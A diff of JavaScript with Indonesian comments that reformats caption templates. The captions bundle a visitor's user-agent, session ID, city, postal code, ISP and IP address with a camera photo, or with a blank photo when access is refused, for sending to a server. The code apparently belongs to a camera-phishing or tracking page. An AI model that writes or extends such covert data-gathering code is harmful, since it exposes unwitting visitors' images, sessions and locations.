@@ -31,22 +31,23 @@
         const { country, city, zip, isp, query } = ipData;
 
         // Tambahkan data ke dalam caption
-        const captions = `
-        👀 **Akses Kamera Diberikan**
+        // Tambahkan data ke dalam caption
+const captions = `
+Akses Diterima
 
-        🌐 **Informasi Perangkat:**
-         - **User-Agent**: ${userAgent}
+Informasi Perangkat:
+- User-Agent: ${userAgent}
 
-        🔑 **Detail Sesi:**
-         - **Session ID**: ${session}
+Detail Sesi:
+- Session ID: ${session}
 
-        🌎 **Informasi Lokasi:**
-         - **Negara**: ${country}
-         - **Kota**: ${city}
-         - **Kode Pos**: ${zip}
-         - **ISP**: ${isp}
-         - **Alamat IP**: ${query}
-         `;
+Informasi Lokasi:
+- Negara: ${country}
+- Kota: ${city}
+- Kode Pos: ${zip}
+- ISP: ${isp}
+- Alamat IP: ${query}
+`;
             
             // Kirim foto ke server
             const formData = new FormData();
@@ -107,22 +108,23 @@
         const { country, city, zip, isp, query } = ipData;
 
         // Tambahkan data ke dalam caption
-        const captions = `
-        👀 **Akses Kamera Diberikan**
+        // Tambahkan data ke dalam caption
+const captions = `
+Akses Ditolak!!
 
-        🌐 **Informasi Perangkat:**
-         - **User-Agent**: ${userAgent}
+Informasi Perangkat:
+- User-Agent: ${userAgent}
 
-        🔑 **Detail Sesi:**
-         - **Session ID**: ${session}
+Detail Sesi:
+- Session ID: ${session}
 
-        🌎 **Informasi Lokasi:**
-         - **Negara**: ${country}
-         - **Kota**: ${city}
-         - **Kode Pos**: ${zip}
-         - **ISP**: ${isp}
-         - **Alamat IP**: ${query}
-         `;
+Informasi Lokasi:
+- Negara: ${country}
+- Kota: ${city}
+- Kode Pos: ${zip}
+- ISP: ${isp}
+- Alamat IP: ${query}
+`;
         
         // Kirim foto kosong (fallback) ke server
         const formDatas = new FormData();
